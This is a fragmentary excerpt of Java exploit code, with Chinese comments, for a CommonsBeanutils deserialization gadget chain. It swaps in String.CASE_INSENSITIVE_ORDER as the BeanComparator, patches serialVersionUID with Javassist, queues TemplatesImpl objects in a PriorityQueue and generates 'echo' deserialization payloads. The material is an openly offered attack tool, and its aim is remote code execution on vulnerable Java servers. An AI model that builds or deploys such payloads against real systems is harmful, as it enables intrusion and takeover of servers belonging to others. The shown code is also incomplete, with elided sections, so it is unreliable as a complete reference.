...
/**
 * CommonsBeanutilsString_183 利用链
 * 结合 CBString 和 CB1_183：
 * 1. 使用 Javassist 动态修改 serialVersionUID
 * 2. 使用 String.CASE_INSENSITIVE_ORDER 作为比较器
...
public class CommonsBeanutilsString_183 {
    ...
    private byte[] getPayload(TemplatesImpl templatesImpl) throws Exception {
        ...
        // 设置 comparator 为 String.CASE_INSENSITIVE_ORDER
        setFieldValue(beanComparator, "comparator", String.CASE_INSENSITIVE_ORDER);

        // 创建 PriorityQueue
        final PriorityQueue<String> queue = new PriorityQueue(2, (Comparator<?>) beanComparator);
    ...
    public static String genEchoPayload(String echoType, String key) throws Exception {
        ...
        // 生成反序列化 payload
        byte[] payload = new CommonsBeanutilsString_183().getPayload(templatesImpl);
